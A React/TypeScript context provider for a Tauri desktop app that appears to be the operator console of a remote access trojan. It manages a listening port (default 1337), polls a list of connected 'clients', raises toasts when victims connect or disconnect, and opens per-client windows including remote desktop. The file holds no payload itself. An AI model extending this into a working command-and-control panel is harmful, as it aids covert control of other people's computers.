import React, { useState, useEffect, useRef } from "react";
import { RATContext } from "./RATContext";
import { listen } from "@tauri-apps/api/event";
import toast from "react-hot-toast";
import { RATState, RATClient, RATProviderProps } from "../../types";
import { fetchClientsCmd, fetchStateCmd } from "./RATCommands";
import { WebviewWindow } from "@tauri-apps/api/window";
import { invoke } from "@tauri-apps/api/tauri";

export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
  const [port, setPort] = useState<string>("1337");
  const [running, setRunning] = useState<boolean>(false);
  const [clientList, setClientList] = useState<RATClient[]>([]);
  const [notificationClient, setNotificationClient] = useState<boolean>(true);
  const notificationClientRef = useRef(false);
  const [listenClientNotif, setListenClientNotif] = useState<boolean>(false);
  const [selectedClient, setSelectedClient] = useState<string>("");

  async function fetchClients() {
    setClientList(await fetchClientsCmd());
  }

  async function fetchState() {
    const state: RATState = await fetchStateCmd();
    const running = state.running;
    setRunning(running);
  }

  useEffect(() => {
    if (!running) return;

    fetchClients();
    fetchState();

    const clientsInterval = setInterval(fetchClients, 10000);
    const stateInterval = setInterval(fetchState, 1000);

    return () => {
      clearInterval(clientsInterval);
      clearInterval(stateInterval);
    };
  }, [running]);

  const customToast = (icon: string, toast_message: string, style: string) => {
    return toast(toast_message, {
      icon,
      className: `${style} text-lg`,
    });
  };

  const cleanupRemoteDesktop = async (clientId: string) => {
    try {
      await invoke("stop_remote_desktop", { id: clientId }).catch((err) =>
        console.error(
          `Error stopping remote desktop for client ${clientId}:`,
          err
        )
      );
    } catch (error) {
      console.error(
        `Failed to cleanup remote desktop for client ${clientId}:`,
        error
      );
    }
  };

  const openClientWindow = async (
    clientId: string,
    type: string,
    url: string,
    title?: string
  ) => {
    try {
      const fullUrl = url.includes(":id")
        ? url.replace(":id", clientId)
        : `${url}${url.includes("?") ? "&" : "?"}id=${clientId}`;

      const windowId = `${clientId}-${type}-${Date.now()}`;

      const window = new WebviewWindow(windowId, {
        url: fullUrl,
        title: title || `Client ${clientId}`,
        width: 1280,
        height: 720,
        resizable: true,
      });

      if (type === "remote-desktop") {
        window.once("tauri://close-requested", async () => {
          await cleanupRemoteDesktop(clientId);
        });
      }

      return window;
    } catch (error) {
      console.error(
        `Failed to open ${type} window for client ${clientId}:`,
        error
      );
    }
  };

  async function waitNotification(type: string) {
    listen(type, async (event) => {
      const clientId = event.payload as string;
      let icon = type == "client_connected" ? "🤙" : "👋";
      let message = type == "client_connected" ? "connected" : "disconnected";
      let style =
        type == "client_connected"
          ? "!bg-primary !text-primary-content"
          : "!bg-neutral !text-neutral-content";
      let toast_message = `Client ${clientId} has ${message}!`;

      fetchClients();
      if (notificationClientRef.current)
        customToast(icon, toast_message, style);
    });
  }

  useEffect(() => {
    if (!listenClientNotif) {
      setListenClientNotif(true);
      waitNotification("client_connected");
      waitNotification("client_disconnected");
    }
  }, [listenClientNotif]);

  useEffect(() => {
    notificationClientRef.current = notificationClient;
  }, [notificationClient]);

  const RATdata = {
    port,
    setPort,
    fetchClients,
    setRunning,
    running,
    clientList,
    setSelectedClient,
    selectedClient,
    setNotificationClient,
    notificationClient,
    openClientWindow,
  };

  return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
};
